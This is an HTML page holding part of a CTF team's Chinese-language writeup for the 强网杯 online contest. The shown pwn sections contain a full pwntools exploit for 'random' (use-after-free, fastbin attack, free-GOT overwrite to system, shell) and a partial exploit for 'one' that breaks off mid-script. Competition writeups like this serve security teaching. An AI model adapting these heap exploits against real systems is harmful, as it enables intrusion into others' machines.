<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>强网杯线上赛 Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for 强网杯线上赛 Writeup" />
    <meta property="og:description" content="Writeup for 强网杯线上赛 Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#random">random</a>
    
                <a class="dropdown-item" href="#one">one</a>
    
                <a class="dropdown-item" href="#daybyday">daybyday</a>
    
                <a class="dropdown-item" href="#trywrite">trywrite</a>
    
                <a class="dropdown-item" href="#childjs">childjs</a>
    
                <a class="dropdown-item" href="#babycpp">babycpp</a>
    
                <a class="dropdown-item" href="#warmup">warmup</a>
    
                <a class="dropdown-item" href="#强网ap">强网ap</a>
    
                <a class="dropdown-item" href="#babymimic">babymimic</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                re
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#justre">justre</a>
    
                <a class="dropdown-item" href="#webassembly">webassembly</a>
    
                <a class="dropdown-item" href="#boringcrypto">boringcrypto</a>
    
                <a class="dropdown-item" href="#设备固件">设备固件</a>
    
                <a class="dropdown-item" href="#强网先锋_ad">强网先锋_ad</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#鲲，坤-or-game">鲲，坤-or-game</a>
    
                <a class="dropdown-item" href="#强网先锋-打野">强网先锋-打野</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#强网先锋-辅助">强网先锋-辅助</a>
    
                <a class="dropdown-item" href="#babybank">babybank</a>
    
                <a class="dropdown-item" href="#babybet">babybet</a>
    
                <a class="dropdown-item" href="#copperstudy">copperstudy</a>
    
                <a class="dropdown-item" href="#randomstudy">randomstudy</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#upload">upload</a>
    
                <a class="dropdown-item" href="#随便注">随便注</a>
    
                <a class="dropdown-item" href="#高明的黑客">高明的黑客</a>
    
                <a class="dropdown-item" href="#babywebbb">babywebbb</a>
    
                <a class="dropdown-item" href="#强网先锋-上单">强网先锋-上单</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#random" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">random</span>
            </a>
    
<a href="#one" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">one</span>
            </a>
    
<a href="#daybyday" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">daybyday</span>
            </a>
    
<a href="#trywrite" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">trywrite</span>
            </a>
    
<a href="#childjs" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">childjs</span>
            </a>
    
<a href="#babycpp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babycpp</span>
            </a>
    
<a href="#warmup" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">warmup</span>
            </a>
    
<a href="#强网ap" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">强网ap</span>
            </a>
    
<a href="#babymimic" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babymimic</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">re</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#justre" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">justre</span>
            </a>
    
<a href="#webassembly" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">webassembly</span>
            </a>
    
<a href="#boringcrypto" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">boringcrypto</span>
            </a>
    
<a href="#设备固件" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">设备固件</span>
            </a>
    
<a href="#强网先锋_ad" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">强网先锋_ad</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#鲲，坤-or-game" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">鲲，坤-or-game</span>
            </a>
    
<a href="#强网先锋-打野" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">强网先锋-打野</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#强网先锋-辅助" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">强网先锋-辅助</span>
            </a>
    
<a href="#babybank" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babybank</span>
            </a>
    
<a href="#babybet" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babybet</span>
            </a>
    
<a href="#copperstudy" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">copperstudy</span>
            </a>
    
<a href="#randomstudy" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">randomstudy</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#upload" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">upload</span>
            </a>
    
<a href="#随便注" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">随便注</span>
            </a>
    
<a href="#高明的黑客" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">高明的黑客</span>
            </a>
    
<a href="#babywebbb" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babywebbb</span>
            </a>
    
<a href="#强网先锋-上单" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">强网先锋-上单</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="强网杯线上赛-writeup"><a class="header-link" href="#强网杯线上赛-writeup"></a>强网杯线上赛 Writeup</h1>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>PWN</h2>
<h3 id="random"><a class="header-link" href="#random"></a>RANDOM</h3>
<p>简单的UAF，fastbin attack打全局list，然后任意地址读写</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    p = process(<span class="hljs-string">&#x27;./random&#x27;</span>)
<span class="hljs-keyword">else</span>:
    p = remote(<span class="hljs-string">&#x27;49.4.66.242&#x27;</span>, <span class="hljs-number">32150</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">refuse</span>(<span class="hljs-params">a=<span class="hljs-number">1</span></span>):</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(a):
        p.sendlineafter(<span class="hljs-string">&#x27;note?(Y/N)&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">accept</span>():</span>
    p.sendlineafter(<span class="hljs-string">&#x27;note?(Y/N)&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size=<span class="hljs-number">100</span>, content=<span class="hljs-literal">None</span>, t=<span class="hljs-literal">None</span></span>):</span>
    accept()
    p.sendlineafter(<span class="hljs-string">&#x27;Input the size of the note:&#x27;</span>, <span class="hljs-built_in">str</span>(size))
    <span class="hljs-keyword">if</span> content:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(content) &lt; size:
            p.sendlineafter(<span class="hljs-string">&#x27;Input the content of the note:&#x27;</span>, content)
            sleep(<span class="hljs-number">0.1</span>)
        <span class="hljs-keyword">else</span>:
            p.sendafter(<span class="hljs-string">&#x27;Input the content of the note:&#x27;</span>, content)
        <span class="hljs-keyword">if</span> t:
            p.sendlineafter(<span class="hljs-string">&#x27;tomorrow?(Y/N)&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>)
        <span class="hljs-keyword">else</span>:
            p.sendlineafter(<span class="hljs-string">&#x27;tomorrow?(Y/N)&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>)
    


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free_view</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>=<span class="hljs-number">16</span></span>):</span>
    accept()
    p.sendlineafter(<span class="hljs-string">&quot;Input the index of the note:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>=<span class="hljs-number">16</span>, content=<span class="hljs-literal">None</span></span>):</span>
    accept()
    p.sendlineafter(<span class="hljs-string">&quot;Input the index of the note:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
    <span class="hljs-keyword">if</span> content:
        p.sendafter(<span class="hljs-string">&quot;Input the new content of the note:&quot;</span>, content)
        sleep(<span class="hljs-number">0.1</span>)



<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip</span>(<span class="hljs-params">n</span>):</span>
    <span class="hljs-comment"># smart skip</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(n):
        p.recvuntil(<span class="hljs-string">&quot;Do you want to &quot;</span>)
        data = p.recvuntil(<span class="hljs-string">&#x27; &#x27;</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;add&#x27;</span> <span class="hljs-keyword">in</span> data:
            add()
        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;update&#x27;</span> <span class="hljs-keyword">in</span> data:
            update()
        <span class="hljs-keyword">else</span>:
            free_view()


p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;nonick1&#x27;</span>)
p.recvuntil(<span class="hljs-string">&#x27;nonick1\n&#x27;</span>)
base = u64(p.recvuntil(<span class="hljs-string">&#x27;?&#x27;</span>, drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xb90</span>

log.success(<span class="hljs-string">&#x27;base:&#x27;</span> + <span class="hljs-built_in">hex</span>(base))

p.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">9</span>):
    p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;10&#x27;</span>)
    skip(<span class="hljs-number">10</span>)

p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
add(<span class="hljs-number">0x21</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-number">1</span>)
add(<span class="hljs-number">0x17</span>, p64(base + <span class="hljs-number">0x1427</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">2</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">0</span>)  <span class="hljs-comment"># fake object to update function</span>
add(<span class="hljs-number">0x21</span>, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0x21</span>, <span class="hljs-number">0</span>)

<span class="hljs-keyword">if</span> debug:
    <span class="hljs-comment">#gdb.attach(p, &#x27;source bp&#x27;)</span>
    <span class="hljs-keyword">pass</span>
p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)
add(<span class="hljs-number">0x21</span>, p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">2</span>, <span class="hljs-number">0</span>)
update(<span class="hljs-number">1</span>, p64(base + <span class="hljs-number">0x2031a0</span>).ljust(<span class="hljs-number">0x17</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))  <span class="hljs-comment"># fastbin attack</span>

p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
add(<span class="hljs-number">0x17</span>,  p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">2</span> , <span class="hljs-number">1</span>)


p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)
free_got=<span class="hljs-number">0x203018</span> 
add(<span class="hljs-number">0x17</span>, p64(base + <span class="hljs-number">0x203018</span>) + p64(<span class="hljs-number">8</span>) , <span class="hljs-number">0</span>)

p.sendlineafter(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
free_view(<span class="hljs-number">3</span>)
p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)
libc=p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>]
libc=libc.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>)
libc=u64(libc)-<span class="hljs-number">0x844f0</span>
system=libc+<span class="hljs-number">0x45390</span>

p.sendlineafter(<span class="hljs-string">&#x27;(0~10)&#x27;</span>, <span class="hljs-string">&#x27;10&#x27;</span>)
skip(<span class="hljs-number">10</span>)
p.sendlineafter(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
skip(<span class="hljs-number">1</span>) 
p.sendlineafter(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
update(<span class="hljs-number">3</span>, p64(system))  
p.sendlineafter(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
free_view(<span class="hljs-number">0</span>)<span class="hljs-comment">#</span>
p.interactive()</code></pre><h3 id="one"><a class="header-link" href="#one"></a>ONE</h3>
<p>abs=-1 leak基地址，usortbin attack打范围，tcache attack劫持控制流</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack

context(arch=<span class="hljs-string">&quot;amd64&quot;</span>, os=<span class="hljs-string">&quot;linux&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)
<span class="hljs-comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">oio</span>(<span class="hljs-params">target</span>):</span>
    <span class="hljs-keyword">global</span> io

    io=process(target)
    io=remote(<span class="hljs-string">&quot;117.78.48.182&quot;</span>,<span class="hljs-number">31900</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ia</span>():</span>
    <span class="hljs-keyword">global</span> io
    io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">att</span>():</span>
    gdb.attach(io,<span class="hljs-string">&quot;source bp&quot;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sl</span>(<span class="hljs-params">data</span>):</span>
    <span class="hljs-keyword">global</span> io
    io.sendline(<span class="hljs-built_in">str</span>(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">se</span>(<span class="hljs-params">data</span>):</span>
    <span class="hljs-keyword">global</span> io
    io.send(<span class="hljs-built_in">str</span>(data))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ru</span>(<span class="hljs-params">delim</span>):</span>
    <span class="hljs-keyword">global</span> io
    data=io.recvuntil(delim)
    <span class="hljs-keyword">return</span> data
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rl</span>(<span class="hljs-params"><span class="hljs-built_in">len</span></span>):</span>
    <span class="hljs-keyword">global</span> io
    data=io.recv(<span class="hljs-built_in">len</span>,timeout=<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> data
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">string</span>):</span>
    ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
    sl(<span class="hljs-number">1</span>)
    ru(<span class="hljs-string">&quot;string:&quot;</span>)
    sl(string)
    ru(<span class="hljs-string">&quot;Success!&quot;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,old_chr,new_chr</span>):</span>
    ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
    sl(<span class="hljs-number">2</span>)
    ru(<span class="hljs-string">&quot;Please give me the index of the string:&quot;</span>)
    sl(idx)
    ru(<span class="hljs-string">&quot;Which char do you want to edit:&quot;</span>)
    se(old_chr)
    ru(<span class="hljs-string">&quot;What do you want to edit it into:&quot;</span>)
    sl(new_chr)
    ru(<span class="hljs-string">&quot;Success!&quot;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">feed</span>(<span class="hljs-params">idx,size</span>):</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):
        edit(idx,<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-string">&#x27;\x66&#x27;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
    ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
    sl(<span class="hljs-number">3</span>)
    ru(<span class="hljs-string">&quot;Please give me the index of the string:&quot;</span>)
    sl(idx)
    ru(<span class="hljs-string">&quot;The string is:&quot;</span>)
    ru(<span class="hljs-string">&quot;\n&quot;</span>)
    <span class="hljs-keyword">return</span> ru(<span class="hljs-string">&quot;\n&quot;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
    ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
    sl(<span class="hljs-number">4</span>)
    ru(<span class="hljs-string">&quot;Please give me the index of the string:&quot;</span>)
    sl(idx)
    ru(<span class="hljs-string">&quot;Success!&quot;</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leakbase</span>():</span>
    ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
    sl(<span class="hljs-string">&quot;12580&quot;</span>)
    ru(<span class="hljs-string">&quot;(Y/N)&quot;</span>)
    sl(<span class="hljs-string">&quot;Y&quot;</span>)
    ru(<span class="hljs-string">&quot;test&quot;</span>)
    sl(<span class="hljs-string">&quot;2147483648&quot;</span>)
    ru(<span class="hljs-string">&quot;The string:\n&quot;</span>)
    <span class="hljs-keyword">return</span> ru(<span class="hljs-string">&quot;\n&quot;</span>)
oio(<span class="hljs-string">&quot;./one&quot;</span>)
base=u64(leakbase()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x2030c0</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))
add(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;4&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;5&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;6&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;7&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;8&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;9&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;4&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;5&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;6&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&#x27;7&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">&quot;hijklmno&quot;</span>+p64(<span class="hljs-number">0x21</span>))

edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;o\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;n\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;m\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;l\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;k\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;j\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;h\x20&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>)
edit(<span class="hljs-number">17</span>,<span class="hljs-string">&#x27;i\x04&#x27;</span>,<span class="hljs-string">&#x27;\x04&#x27;</span>)

<span class="hljs-comment">#att()</span>
feed(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-string">&#x27;\x04&#x27;</span>)
edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x41\x21&#x27;</span>,<span class="hljs-string">&#x27;\x21&#x27;</span>)

delete(<span class="hljs-number">1</span>)
